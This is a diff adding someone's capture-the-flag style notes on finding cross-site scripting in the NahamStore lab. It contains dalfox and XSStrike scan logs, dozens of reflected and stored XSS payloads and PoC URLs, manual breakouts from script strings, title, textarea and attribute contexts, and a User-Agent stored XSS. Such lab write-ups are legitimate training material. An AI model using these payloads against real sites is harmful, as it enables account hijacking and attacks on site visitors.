@@ -1104,3 +1104,1110 @@ Usage:
 
 Available Commands:
   completion  Generate the autocompletion script for the specified shell
+  file        Use file mode(targets list or rawdata)
+  help        Help about any command
+  payload     Payload mode, make and enum payloads
+  pipe        Use pipeline mode
+  server      Start API Server
+  sxss        Use Stored XSS mode
+  url         Use single target mode
+  version     Show version
+
+Flags:
+  -b, --blind string                Add your blind xss
+                                      * Example: -b hahwul.xss.ht
+      --config string               Using config from file
+  -C, --cookie string               Add custom cookie
+      --cookie-from-raw string      Load cookie from burp raw http request
+                                      * Example: --cookie-from-raw request.txt
+      --custom-alert-type string    Change alert value type
+                                      * Example: --custom-alert-type=none / --custom-alert-type=str,none (default "none")
+      --custom-alert-value string   Change alert value
+                                      * Example: --custom-alert-value=document.cookie (default "1")
+      --custom-payload string       Add custom payloads from file
+  -d, --data string                 Using POST Method and add Body data
+      --debug                       debug mode, save all log using -o option
+      --deep-domxss                 DOM XSS Testing with more payloads on headless [so slow]
+      --delay int                   Milliseconds between send to same host (1000==1s)
+  -F, --follow-redirects            Following redirection
+      --format string               Stdout output format
+                                      * Supported: plain / json (default "plain")
+      --found-action string         If found weak/vuln, action(cmd) to next
+                                      * Example: --found-action='./notify.sh'
+      --found-action-shell string   Select shell application for --found-action (default "bash")
+      --grep string                 Using custom grepping file
+                                      * Example: --grep ./samples/sample_grep.json
+  -H, --header strings              Add custom headers
+  -h, --help                        help for dalfox
+      --ignore-param strings        Ignores this parameter when scanning.
+                                      * Example: --ignore-param api_token --ignore-param csrf_token
+      --ignore-return string        Ignores scanning from return code
+                                      * Example: --ignore-return 302,403,404
+  -X, --method string               Force overriding HTTP Method
+                                      * Example: -X PUT (default "GET")
+      --mining-dict                 Find new parameter with dictionary attack, default is Gf-Patterns=>XSS (default true)
+  -W, --mining-dict-word string     Custom wordlist file for param mining
+                                      * Example: --mining-dict-word word.txt
+      --mining-dom                  Find new parameter in DOM (attribute/js value) (default true)
+      --no-color                    Not use colorize
+      --no-spinner                  Not use spinner
+      --only-custom-payload         Only testing custom payload (required --custom-payload)
+      --only-discovery              Only testing parameter analysis (same '--skip-xss-scanning' option)
+      --only-poc string             Shows only the PoC code for the specified pattern (g: grep / r: reflected / v: verified)
+                                     * Example: --only-poc='g,v'
+  -o, --output string               Write to output file (By default, only the PoC code is saved)
+      --output-all                  All log write mode (-o or stdout)
+  -p, --param strings               Only testing selected parameters
+      --poc-type string             Select PoC type 
+                                     * Supported: plain/curl/httpie/http-request
+                                     * Example: --poc-type='curl' (default "plain")
+      --proxy string                Send all request to proxy server
+                                      * Example: --proxy http://127.0.0.1:8080
+      --remote-payloads string      Using remote payload for XSS testing
+                                      * Supported: portswigger/payloadbox
+                                      * Example: --remote-payloads=portswigger,payloadbox
+      --remote-wordlists string     Using remote wordlists for param mining
+                                      * Supported: burp/assetnote
+                                      * Example: --remote-wordlists=burp
+      --report                      Show detail report
+      --report-format string        Format of --report flag [plain/json] (default "plain")
+  -S, --silence                     Only print PoC Code and Progress(for pipe/file mode)
+      --skip-bav                    Skipping BAV(Basic Another Vulnerability) analysis
+      --skip-grepping               Skipping built-in grepping
+      --skip-headless               Skipping headless browser base scanning[DOM XSS and inJS verify]
+      --skip-mining-all             Skipping ALL parameter mining
+      --skip-mining-dict            Skipping Dict base parameter mining
+      --skip-mining-dom             Skipping DOM base parameter mining
+      --skip-xss-scanning           Skipping XSS Scanning (same '--only-discovery' option)
+      --timeout int                 Second of timeout (default 10)
+      --user-agent string           Add custom UserAgent
+      --waf-evasion                 Avoid blocking by adjusting the speed when detecting WAF (worker=1 delay=3s)
+  -w, --worker int                  Number of worker (default 100)
+
+┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
+└─$ dalfox url "http://marketing.nahamstore.thm/?error="
+
+    _..._
+  .' .::::.   __   _   _    ___ _ __ __
+ :  :::::::: |  \ / \ | |  | __/ \\ V /
+ :  :::::::: | o ) o || |_ | _( o )) (
+ '. '::::::' |__/|_n_||___||_| \_//_n_\
+   '-.::''    
+
+🌙🦊 Powerful open source XSS scanning tool and parameter analyzer, utility
+
+ 🎯  Target                 http://marketing.nahamstore.thm/?error=
+ 🏁  Method                 GET
+ 🖥   Worker                 100
+ 🔦  BAV                    true
+ ⛏   Mining                 true (Gf-Patterns)
+ 🔬  Mining-DOM             true (mining from DOM)
+ ⏱   Timeout                10
+ 📤  FollowRedirect         false
+ 🕰   Started at             .136798704 -0400 EDT m=+0.087319242
+
+ >>>>>>>>>>>>>>>>>>>>>>>>>
+[*] 🦊 Start scan [SID:Single] / URL: http://marketing.nahamstore.thm/?error=
+[I] Found 0 testing point in DOM base parameter mining
+[I] Found 1 testing point in Dictionary base paramter mining
+[I] Content-Type is text/html; charset=UTF-8
+[I] Reflected error param => PTYPE: URL  Injected: /inHTML-none(1)  \  >  [  ,  -  )  `  ]  :  =  <  }  ;  {  +  "  '  |  .  $  (
+    16 line:                  <p>DalFo
+[W] Reflected Payload in HTML: error=<ScRipt>prompt.valueOf()(1)</script>
+    16 line:                  <p><ScRipt>prompt.valueOf()(1)</script></p>
+[POC][R][GET][inHTML-none(1)-URL] http://marketing.nahamstore.thm/?error=%3CScRipt%3Eprompt.valueOf%28%29%281%29%3C%2Fscript%3E
+[V] Triggered XSS Payload (found DOM Object): error='><svg/class='dalfox'onLoad=alert(1)>
+    16 line:                  <p>'><svg/class='dalfox'onLoad=alert(1)></p>
+[POC][V][GET][inHTML-URL] http://marketing.nahamstore.thm/?error=%27%3E%3Csvg%2Fclass%3D%27dalfox%27onLoad%3Dalert%281%29%3E
+[*] -------------------------------------------------------------------------------------------------
+[*] [duration: 7.64803607s][issues: 2] Finish Scan!
+
+http://marketing.nahamstore.thm/?error=%3Ciframe+srcdoc%3D%22%3Cinput+onauxclick%3Dprompt(document.domain)%3E%22+class%3Ddalfox%3E%3C%2Fiframe%3E
+
+┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
+└─$ dalfox url 'http://nahamstore.thm/search?q='        
+
+    _..._
+  .' .::::.   __   _   _    ___ _ __ __
+ :  :::::::: |  \ / \ | |  | __/ \\ V /
+ :  :::::::: | o ) o || |_ | _( o )) (
+ '. '::::::' |__/|_n_||___||_| \_//_n_\
+   '-.::''    
+
+🌙🦊 Powerful open source XSS scanning tool and parameter analyzer, utility
+
+ 🎯  Target                 http://nahamstore.thm/search?q=
+ 🏁  Method                 GET
+ 🖥   Worker                 100
+ 🔦  BAV                    true
+ ⛏   Mining                 true (Gf-Patterns)
+ 🔬  Mining-DOM             true (mining from DOM)
+ ⏱   Timeout                10
+ 📤  FollowRedirect         false
+ 🕰   Started at             .418876483 -0400 EDT m=+1.320009517
+
+ >>>>>>>>>>>>>>>>>>>>>>>>>
+[*] 🦊 Start scan [SID:Single] / URL: http://nahamstore.thm/search?q=
+[I] Found 0 testing point in DOM base parameter mining
+[I] Found 1 testing point in Dictionary base paramter mining
+[I] Content-Type is text/html; charset=UTF-8
+[I] Reflected PATH '/dalfoxpathtest' => Injected: /inHTML-none(1)]
+[I] Reflected q param => PTYPE: URL  Injected: /inHTML-none(1)/inJS-single(1)  $  {  :  "  |  }  '  `  (  \  ;  [  .  )  =  -  ,  +  ]
+    38 line:      <h3 class="text-center">Search Results For "DalFox"</h3>
+    52 line:      var search = 'Dal
+ ⠸  [820/1731 Queries][47.37%] Testing "q" param and waiting headless2023/03/20 17:41:11 ERROR: could not retrieve document root for 291A8313829BBFE1B79358D6C75515E5: context deadline exceeded
+ ⠹  [1393/1731 Queries][80.47%] Testing "q" param and waiting headless2023/03/20 17:41:49 ERROR: could not retrieve document root for 4F3E43A3A6C6B87964A4C707837659F0: context deadline exceeded
+ ⠸  [1535/1731 Queries][88.68%] Testing "q" param and waiting headless2023/03/20 17:41:55 ERROR: could not retrieve document root for F387420C57D81CA612A7A4981C0BDA92: context deadline exceeded
+[V] Triggered XSS Payload (found dialog in headless)d waiting headless
+[POC][V][GET][inJS-single(1)-URL] http://nahamstore.thm/search?q=%27-confirm.apply%28null%2C%5B1%5D%29-%27
+[V] Triggered XSS Payload (found dialog in headless)eries and waiting headless
+[POC][V][GET][inJS-single(1)-URL] http://nahamstore.thm/search?q=%27%2Balert.call%28null%2C1%29%2B%27
+[*] ---------------------------------------------------------------------------------------------------------------------------------
+[*] [duration: 2m2.558570607s][issues: 229] Finish Scan!
+
+'-confirm.apply(null,[document.domain])-'
+http://nahamstore.thm/search?q=%27-confirm.apply(null%2C[document.domain])-%27
+
+'+alert.call(null,document.domain)+'
+http://nahamstore.thm/search?q=%27%2Balert.call(null%2Cdocument.domain)%2B%27
+
+This is a nice tool :)
+
+or doing manually
+
+<script>
+    var search = '';alert(document.domain)//';
+    $.get('/search-products?q=' + search,function(resp){
+        if( resp.length == 0 ){
+
+            $('.product-list').html('<div class="text-center" style="margin:10px">No matching products found</div>');
+
+        }else {
+            $.each(resp, function (a, b) {
+                $('.product-list').append('<div class="col-md-4">' +
+                    '<div class="product_holder" style="border:1px solid #ececec;padding: 15px;margin-bottom:15px">' +
+                    '<div class="image text-center"><a href="/product?id=' + b.id + '"><img class="img-thumbnail" src="/product/picture/?file=' + b.img + '.jpg"></a></div>' +
+                    '<div class="text-center" style="font-size:20px"><strong><a href="/product?id=' + b.id + '">' + b.name + '</a></strong></div>' +
+                    '<div class="text-center"><strong>$' + b.cost + '</strong></div>' +
+                    '<div class="text-center" style="margin-top:10px"><a href="/product?id=' + b.id + '" class="btn btn-success">View</a></div>' +
+                    '</div>' +
+                    '</div>');
+            });
+        }
+    });
+</script>
+
+we can do it cause we're inside <script>alert(document.domain)</script>
+
+and we need only alert but before this need to finish
+
+var search = '';
+and // to comment all
+
+o finally PoC will be
+
+';alert(document.domain)//
+
+http://nahamstore.thm/search?q=%27;alert(document.domain)//
+
+or scaping like this to close '
+
+http://nahamstore.thm/search?q=%27;alert(document.domain);%27
+
+';alert(document.domain);'
+
+using another tool but not effective like dalfox
+
+┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
+└─$ cd ../XSStrike 
+                                                                                                                                      
+┌──(witty㉿kali)-[~/bug_hunter/XSStrike]
+└─$ python3 xsstrike.py -u 'http://nahamstore.thm/search?q='          
+
+	XSStrike v3.1.5
+
+[~] Checking for DOM vulnerabilities 
+[+] WAF Status: Offline 
+[!] Testing parameter: q 
+[!] Reflections found: 2 
+[~] Analysing reflections 
+[~] Generating payloads 
+[!] Payloads generated: 3072 
+------------------------------------------------------------
+[+] Payload: <D3V%0doNMouseOvER%0d=%0d(confirm)()//v3dm0s 
+[!] Efficiency: 92 
+[!] Confidence: 10 
+------------------------------------------------------------
+[+] Payload: <A%0donmOUseOVER%0d=%0dconfirm()%0dx//v3dm0s 
+[!] Efficiency: 92 
+[!] Confidence: 10 
+
+now create an acc 
+
+http://nahamstore.thm/returns
+
+Invalid Order Number
+
+Please select a valid return reason
+
+http://nahamstore.thm/register
+
+Invalid Email Address entered
+
+http://nahamstore.thm/account/orders/4
+
+User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+
+intercept with burp
+
+User Agent: <script>alert(document.domain)</script>
+
+everytime will go to orders we get (stored xss)
+
+nahamstore.thm
+
+we need to scape title
+http://nahamstore.thm/product?id=1&name=%3C/title%3E%3Cscript%3Ealert(1)%3C/script%3E//
+
+name=</title><script>alert(1)</script>//
+
+<title>NahamStore - </title>
+
+Now in returns we need to scape textarea
+
+<textarea class="form-control">&lt;h1&gt;hi&lt;/h1&gt;</textarea>
+
+</textarea><script>alert(document.domain)</script>//
+
+nahamstore.thm
+
+<input placeholder="Discount Code" class="form-control" name="discount" value="">
+
+http://nahamstore.thm/product?id=2&added=1
+
+let's intercept
+
+POST /product?id=2&added=1 HTTP/1.1
+
+Host: nahamstore.thm
+
+...
+
+add_to_basket=1&discount=123
+
+http://nahamstore.thm/product?id=2&added=1&discount="<script>alert(document.domain)</script>
+
+<input placeholder="Discount Code" class="form-control" name="discount" value="" scriptalert(document.domain)="" script"="">
+
+let's use dalfox
+
+┌──(witty㉿kali)-[~/bug_hunter/XSStrike]
+└─$ dalfox url "http://nahamstore.thm/product?id=2&added=1&discount="
+
+    _..._
+  .' .::::.   __   _   _    ___ _ __ __
+ :  :::::::: |  \ / \ | |  | __/ \\ V /
+ :  :::::::: | o ) o || |_ | _( o )) (
+ '. '::::::' |__/|_n_||___||_| \_//_n_\
+   '-.::''    
+
+🌙🦊 Powerful open source XSS scanning tool and parameter analyzer, utility
+
+ 🎯  Target                 http://nahamstore.thm/product?id=2&added=1&discount=
+ 🏁  Method                 GET
+ 🖥   Worker                 100
+ 🔦  BAV                    true
+ ⛏   Mining                 true (Gf-Patterns)
+ 🔬  Mining-DOM             true (mining from DOM)
+ ⏱   Timeout                10
+ 📤  FollowRedirect         false
+ 🕰   Started at             .768737313 -0400 EDT m=+1.072962520
+
+ >>>>>>>>>>>>>>>>>>>>>>>>>
+[*] 🦊 Start scan [SID:Single] / URL: http://nahamstore.thm/product?id=2&added=1&discount=
+[G] Found dalfox-error-mysql5 via built-in grepping / payload: toGrepping
+    check the manual that corresponds to your MySQL server version
+[POC][G][GET][BUILTIN] http://nahamstore.thm/product?added=1&discount=&id=%7B444%2A6664%7D
+[I] Found 4 testing point in DOM base parameter mining
+[I] Found 3 testing point in Dictionary base paramter mining
+[I] Content-Type is text/html; charset=UTF-8
+[I] Reflected PATH '/dalfoxpathtest' => Injected: /inHTML-none(1)]
+[I] Reflected discount param => PTYPE: URL  Injected: /inATTR-double(1)  \  :  +  "  [  |  ]  ,  ;  .  =  (  )  $  }  -  {
+    56 line:  e="discount" value="DalFox"><
+[I] Reflected id param => PTYPE: URL  Injected: /inHTML-none(1)  $
+    1 line:  Unknown column '2DalFox' in 'where cl
+[I] Reflected name param => PTYPE: URL  Injected: /inHTML-none(1)  <  \  >  '  "  {  :  (  |  }  ]  +  [  `  -  ,  =  .  ;  )  $
+    7 line:      <title>NahamStore - DalFox</t
+[W] Reflected Payload in HTML: name=<audio controls ondurationchange=v(1)><source src=1.mp3 type=audio/mpeg></audio>
+    7 line:  <title>NahamStore - <audio controls ondurationchange=v(1)><source src=1.mp3 type
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Caudio+controls+ondurationchange%3Dv%281%29%3E%3Csource+src%3D1.mp3+type%3Daudio%2Fmpeg%3E%3C%2Faudio%3E
+[V] Triggered XSS Payload (found DOM Object): discount="onpointerenter=confirm.call(null,1) class=dalfox 
+    56 line:  e="discount" value=""onpointerenter=confirm.call(null,1) class=dalfox "></div>
+[POC][V][GET][inATTR-double(1)-URL] http://nahamstore.thm/product?added=1&discount=%22onpointerenter%3Dconfirm.call%28null%2C1%29+class%3Ddalfox+&id=2
+[V] Triggered XSS Payload (found DOM Object): id=</script><svg><script/class=dalfox>alert(1)</script>-%26apos;
+[POC][V][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2%3C%2Fscript%3E%3Csvg%3E%3Cscript%2Fclass%3Ddalfox%3Ealert%281%29%3C%2Fscript%3E-%2526apos%3B
+[W] Reflected Payload in HTML: name=<xmp><p title="</xmp><svg/onload=print(1) class=dalfox>
+    7 line:  <title>NahamStore - <xmp><p title="</xmp><svg/onload=print(1) class=dalfox></tit
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Cxmp%3E%3Cp+title%3D%22%3C%2Fxmp%3E%3Csvg%2Fonload%3Dprint%281%29+class%3Ddalfox%3E
+[W] Reflected Payload in HTML: name='>asdme" param and waiting headless
+    7 line:      <title>NahamStore - '>asd</title>
+[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%27%3Easd
+[W] Reflected Payload in HTML: name=<div contextmenu=xss><p>1<menu type=context class=dalfox id=xss onshow=alert.bind()(1)></menu></div>
+    7 line:  <title>NahamStore - <div contextmenu=xss><p>1<menu type=context class=dalfox id=
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Cdiv+contextmenu%3Dxss%3E%3Cp%3E1%3Cmenu+type%3Dcontext+class%3Ddalfox+id%3Dxss+onshow%3Dalert.bind%28%29%281%29%3E%3C%2Fmenu%3E%3C%2Fdiv%3E
+[W] Reflected Payload in HTML: name='><svg/class='dalfox'onLoad=alert(1)>
+    7 line:      <title>NahamStore - '><svg/class='dalfox'onLoad=alert(1)></title>
+[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%27%3E%3Csvg%2Fclass%3D%27dalfox%27onLoad%3Dalert%281%29%3E
+[W] Reflected Payload in HTML: name=<iFrAme/src=jaVascRipt:confirm(1) class=dalfox></iFramE>
+    7 line:  <title>NahamStore - <iFrAme/src=jaVascRipt:confirm(1) class=dalfox></iFramE></ti
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CiFrAme%2Fsrc%3DjaVascRipt%3Aconfirm%281%29+class%3Ddalfox%3E%3C%2FiFramE%3E
+[W] Reflected Payload in HTML: name=<sVg/onload=confirm(1)>ing headless
+    7 line:      <title>NahamStore - <sVg/onload=confirm(1)></title>
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CsVg%2Fonload%3Dconfirm%281%29%3E
+[W] Reflected Payload in HTML: name="><Svg/onload=alert(1) class=dlafox>
+    7 line:      <title>NahamStore - "><Svg/onload=alert(1) class=dlafox></title>
+[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%22%3E%3CSvg%2Fonload%3Dalert%281%29+class%3Ddlafox%3E
+[W] Reflected Payload in HTML: name=<ScRipt>confirm(1)</script>
+    7 line:      <title>NahamStore - <ScRipt>confirm(1)</script></title>
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CScRipt%3Econfirm%281%29%3C%2Fscript%3E
+[W] Reflected Payload in HTML: name=<xmp><p title="</xmp><svg/onload=confirm(1) class=dalfox>
+    7 line:  <title>NahamStore - <xmp><p title="</xmp><svg/onload=confirm(1) class=dalfox></t
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Cxmp%3E%3Cp+title%3D%22%3C%2Fxmp%3E%3Csvg%2Fonload%3Dconfirm%281%29+class%3Ddalfox%3E
+[W] Reflected Payload in HTML: name=<audio controls ondurationchange=confirm(1) id=dalfox><source src=1.mp3 type=audio/mpeg></audio>
+    7 line:  <title>NahamStore - <audio controls ondurationchange=confirm(1) id=dalfox><sourc
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Caudio+controls+ondurationchange%3Dconfirm%281%29+id%3Ddalfox%3E%3Csource+src%3D1.mp3+type%3Daudio%2Fmpeg%3E%3C%2Faudio%3E
+[W] Reflected Payload in HTML: name=<iframe srcdoc="<input onauxclick=prompt.valueOf()(1)>" class=dalfox></iframe>
+    7 line:  <title>NahamStore - <iframe srcdoc="<input onauxclick=prompt.valueOf()(1)>" clas
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Ciframe+srcdoc%3D%22%3Cinput+onauxclick%3Dprompt.valueOf%28%29%281%29%3E%22+class%3Ddalfox%3E%3C%2Fiframe%3E
+[W] Reflected Payload in HTML: name=<div contextmenu=xss><p>1<menu type=context class=dalfox id=xss onshow=confirm(1)></menu></div>
+    7 line:  <title>NahamStore - <div contextmenu=xss><p>1<menu type=context class=dalfox id=
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Cdiv+contextmenu%3Dxss%3E%3Cp%3E1%3Cmenu+type%3Dcontext+class%3Ddalfox+id%3Dxss+onshow%3Dconfirm%281%29%3E%3C%2Fmenu%3E%3C%2Fdiv%3E
+[W] Reflected Payload in HTML: name=<xmp><p title="</xmp><svg/onload=prompt.valueOf()(1)>
+    7 line:  <title>NahamStore - <xmp><p title="</xmp><svg/onload=prompt.valueOf()(1)></title
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Cxmp%3E%3Cp+title%3D%22%3C%2Fxmp%3E%3Csvg%2Fonload%3Dprompt.valueOf%28%29%281%29%3E
+[W] Reflected Payload in HTML: name=<sVg/onload=alert.bind()(1)>nd waiting headless
+    7 line:      <title>NahamStore - <sVg/onload=alert.bind()(1)></title>
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CsVg%2Fonload%3Dalert.bind%28%29%281%29%3E
+[W] Reflected Payload in HTML: name=<audio controls ondurationchange=alert(1) id=dalfox><source src=1.mp3 type=audio/mpeg></audio>
+    7 line:  <title>NahamStore - <audio controls ondurationchange=alert(1) id=dalfox><source 
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Caudio+controls+ondurationchange%3Dalert%281%29+id%3Ddalfox%3E%3Csource+src%3D1.mp3+type%3Daudio%2Fmpeg%3E%3C%2Faudio%3E
+[W] Reflected Payload in HTML: name=<ScRipt class=dalfox>confirm(1)</script>eadless
+    7 line:      <title>NahamStore - <ScRipt class=dalfox>confirm(1)</script></title>
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CScRipt+class%3Ddalfox%3Econfirm%281%29%3C%2Fscript%3E
+[W] Reflected Payload in HTML: name=<iFrAme/src=jaVascRipt:print(1) class=dalfox></iFramE>
+    7 line:  <title>NahamStore - <iFrAme/src=jaVascRipt:print(1) class=dalfox></iFramE></titl
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CiFrAme%2Fsrc%3DjaVascRipt%3Aprint%281%29+class%3Ddalfox%3E%3C%2FiFramE%3E
+[W] Reflected Payload in HTML: name=<audio controls ondurationchange=alert.bind()(1) id=dalfox><source src=1.mp3 type=audio/mpeg></audio>
+    7 line:  <title>NahamStore - <audio controls ondurationchange=alert.bind()(1) id=dalfox><
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Caudio+controls+ondurationchange%3Dalert.bind%28%29%281%29+id%3Ddalfox%3E%3Csource+src%3D1.mp3+type%3Daudio%2Fmpeg%3E%3C%2Faudio%3E
+[W] Reflected Payload in HTML: name=<sVg/onload=prompt(1)>eries and waiting headless
+    7 line:      <title>NahamStore - <sVg/onload=prompt(1)></title>
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CsVg%2Fonload%3Dprompt%281%29%3E
+[W] Reflected Payload in HTML: name="><a href="javascript&colon;alert(1)">click
+    7 line:      <title>NahamStore - "><a href="javascript&colon;alert(1)">click</title>
+[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%22%3E%3Ca+href%3D%22javascript%26colon%3Balert%281%29%22%3Eclick
+[W] Reflected Payload in HTML: name=<iframe srcdoc="<input onauxclick=alert.bind()(1)>" class=dalfox></iframe>
+    7 line:  <title>NahamStore - <iframe srcdoc="<input onauxclick=alert.bind()(1)>" class=da
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Ciframe+srcdoc%3D%22%3Cinput+onauxclick%3Dalert.bind%28%29%281%29%3E%22+class%3Ddalfox%3E%3C%2Fiframe%3E
+[W] Reflected Payload in HTML: name=">asdd" param queries and waiting headless
+    7 line:      <title>NahamStore - ">asd</title>
+[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%22%3Easd
+[W] Reflected Payload in HTML: name=<div contextmenu=xss><p>1<menu type=context class=dalfox id=xss onshow=prompt(1)></menu></div>
+    7 line:  <title>NahamStore - <div contextmenu=xss><p>1<menu type=context class=dalfox id=
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Cdiv+contextmenu%3Dxss%3E%3Cp%3E1%3Cmenu+type%3Dcontext+class%3Ddalfox+id%3Dxss+onshow%3Dprompt%281%29%3E%3C%2Fmenu%3E%3C%2Fdiv%3E
+[W] Reflected Payload in HTML: name=<sVg/onload=print(1)>aiting headless
+    7 line:      <title>NahamStore - <sVg/onload=print(1)></title>
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CsVg%2Fonload%3Dprint%281%29%3E
+[W] Reflected Payload in HTML: name=<xmp><p title="</xmp><svg/onload=confirm(1)>
+    7 line:      <title>NahamStore - <xmp><p title="</xmp><svg/onload=confirm(1)></title>
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Cxmp%3E%3Cp+title%3D%22%3C%2Fxmp%3E%3Csvg%2Fonload%3Dconfirm%281%29%3E
+[W] Reflected Payload in HTML: name=<iFrAme/src=jaVascRipt:alert(1) class=dalfox></iFramE>
+    7 line:  <title>NahamStore - <iFrAme/src=jaVascRipt:alert(1) class=dalfox></iFramE></titl
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CiFrAme%2Fsrc%3DjaVascRipt%3Aalert%281%29+class%3Ddalfox%3E%3C%2FiFramE%3E
+[W] Reflected Payload in HTML: name=<iFrAme/src=jaVascRipt:confirm(1)></iFramE>dless
+    7 line:      <title>NahamStore - <iFrAme/src=jaVascRipt:confirm(1)></iFramE></title>
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CiFrAme%2Fsrc%3DjaVascRipt%3Aconfirm%281%29%3E%3C%2FiFramE%3E
+[W] Reflected Payload in HTML: name=<div contextmenu=xss><p>1<menu type=context class=dalfox id=xss onshow=prompt.valueOf()(1)></menu></div>
+    7 line:  <title>NahamStore - <div contextmenu=xss><p>1<menu type=context class=dalfox id=
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Cdiv+contextmenu%3Dxss%3E%3Cp%3E1%3Cmenu+type%3Dcontext+class%3Ddalfox+id%3Dxss+onshow%3Dprompt.valueOf%28%29%281%29%3E%3C%2Fmenu%3E%3C%2Fdiv%3E
+[W] Reflected Payload in HTML: name="><img/src/onerror=.1|alert`` class=dalfox>
+    7 line:      <title>NahamStore - "><img/src/onerror=.1|alert`` class=dalfox></title>
+[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%22%3E%3Cimg%2Fsrc%2Fonerror%3D.1%7Calert%60%60+class%3Ddalfox%3E
+[W] Reflected Payload in HTML: name=<iFrAme/src=jaVascRipt:prompt.valueOf()(1)></iFramE>
+    7 line:  <title>NahamStore - <iFrAme/src=jaVascRipt:prompt.valueOf()(1)></iFramE></title>
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CiFrAme%2Fsrc%3DjaVascRipt%3Aprompt.valueOf%28%29%281%29%3E%3C%2FiFramE%3E
+[W] Reflected Payload in HTML: name=<sVg/onload=prompt.valueOf()(1)>waiting headless
+    7 line:      <title>NahamStore - <sVg/onload=prompt.valueOf()(1)></title>
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CsVg%2Fonload%3Dprompt.valueOf%28%29%281%29%3E
+[W] Reflected Payload in HTML: name='><img/src/onerror=.1|alert``>d waiting headless
+    7 line:      <title>NahamStore - '><img/src/onerror=.1|alert``></title>
+[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%27%3E%3Cimg%2Fsrc%2Fonerror%3D.1%7Calert%60%60%3E
+[W] Reflected Payload in HTML: name="><SvG/onload=alert(1) id=dalfox>
+    7 line:      <title>NahamStore - "><SvG/onload=alert(1) id=dalfox></title>
+[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%22%3E%3CSvG%2Fonload%3Dalert%281%29+id%3Ddalfox%3E
+[W] Reflected Payload in HTML: name=<ScRipt>print(1)</script>
+    7 line:      <title>NahamStore - <ScRipt>print(1)</script></title>
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CScRipt%3Eprint%281%29%3C%2Fscript%3E
+[W] Reflected Payload in HTML: name="><svg/OnLoad="`${prompt``}`">d waiting headless
+    7 line:      <title>NahamStore - "><svg/OnLoad="`${prompt``}`"></title>
+[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%22%3E%3Csvg%2FOnLoad%3D%22%60%24%7Bprompt%60%60%7D%60%22%3E
+[W] Reflected Payload in HTML: name=<sVg/onload=print(1) class=dalfox>
+    7 line:      <title>NahamStore - <sVg/onload=print(1) class=dalfox></title>
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CsVg%2Fonload%3Dprint%281%29+class%3Ddalfox%3E
+[W] Reflected Payload in HTML: name=<iFrAme/src=jaVascRipt:prompt.valueOf()(1) class=dalfox></iFramE>
+    7 line:  <title>NahamStore - <iFrAme/src=jaVascRipt:prompt.valueOf()(1) class=dalfox></iF
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CiFrAme%2Fsrc%3DjaVascRipt%3Aprompt.valueOf%28%29%281%29+class%3Ddalfox%3E%3C%2FiFramE%3E
